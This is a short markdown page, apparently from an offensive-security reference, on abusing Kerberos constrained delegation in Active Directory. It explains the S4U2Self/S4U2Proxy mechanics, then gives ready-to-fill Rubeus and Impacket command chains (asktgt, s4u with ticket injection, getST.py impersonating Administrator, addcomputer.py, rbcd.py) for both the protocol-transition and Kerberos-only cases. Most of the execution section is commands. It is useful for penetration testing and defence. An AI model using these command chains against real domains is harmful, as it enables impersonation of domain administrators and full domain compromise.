# Constrained Delegation

Constrained delegation limits an account to named services, but the S4U2Self and S4U2Proxy extensions let a compromised delegation account request a ticket to those services as any user — including a domain admin — unless protocol transition is restricted.

## Why It Works

S4U2Self lets the account obtain a ticket to itself as an arbitrary user; S4U2Proxy then forwards that to the allowed service. The allowed-to list constrains the target service, not the impersonated user.

## Prerequisites

* Control of an account with `msDS-AllowedToDelegateTo` set
* Any valid domain credential to enumerate the target

## Execution

**Constrained delegation**

* With protocol transition (any) UAC: TRUST\_TO\_AUTH\_FOR\_DELEGATION
  * Get TGT for user
    * Request S4u2self
      * Request S4u2proxy
  * `Rubeus.exe hash /password:<password>` [\[tool\]](https://github.com/GhostPack/Rubeus)
    * `Rubeus.exe asktgt /user:<user> /domain:<domain> /aes256:<AES 256 hash>` [\[tool\]](https://github.com/GhostPack/Rubeus)
      * `Rubeus.exe s4u /ticket:<ticket> /impersonateuser:<admin_user> /msdsspn:<spn_constrained> /altservice:<altservice> /ptt` [\[tool\]](https://github.com/GhostPack/Rubeus)
        * Altservice HTTP/HOST/CIFS/LDAP
          * **→ Kerberos TGS**
  * `getST.py -spn '<spn>/<target>' -impersonate Administrator -dc-ip '<dc_ip>' '<domain>/<user>:<password>' -altservice <altservice>` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/getST.py)
    * Altservice HTTP/HOST/CIFS/LDAP
      * **→ Kerberos TGS**
* Without protocol transition (kerberos only) UAC: TRUSTED\_FOR\_DELEGATION
  * Constrain between Y and Z
    * Add computer X
      * Add RBCD : delegate from X to Y
        * s4u2self X (impersonate admin)
          * S4u2Proxy X (impersonate admin on spn/Y)
            * Forwardable TGS for Y
              * S4u2Proxy Y (impersonate admin on spn/Z)
  * add computer account
    * `addcomputer.py -computer-name '<computer_name>' -computer-pass '<ComputerPassword>' -dc-host <dc> -domain-netbios <domain_netbios> '<domain>/<user>:<password>'` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/addcomputer.py)
  * RBCD With added computer account
    * `rbcd.py -delegate-from '<rbcd_con>$' -delegate-to '<constrained>$' -dc-ip '<dc>' -action 'write' -hashes '<hash>' <domain>/<constrained>$` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
      * `getST.py -spn host/<constrained> -impersonate Administrator --dc-ip <dc_ip> '<domain>/<rbcd_con>$:<rbcd_conpass>'` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/getST.py)
        * `getST.py -spn <constrained_spn>/<target> -hashes '<hash>' '<domain>/<constrained>$' -impersonate Administrator --dc-ip <dc_ip> -additional-ticket <previous_ticket>` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/getST.py)
          * **→ Kerberos TGS**
  * **→ Self RBCD**
    * Like RBCD without add computer

## Related

* [Unconstrained Delegation](file:///9685693/delegation/unconstrained-delegation.md) — the unrestricted form
* [Resource-Based Constrained Delegation](file:///9685693/delegation/resource-based-constrained-delegation.md) — delegation configured from the target side
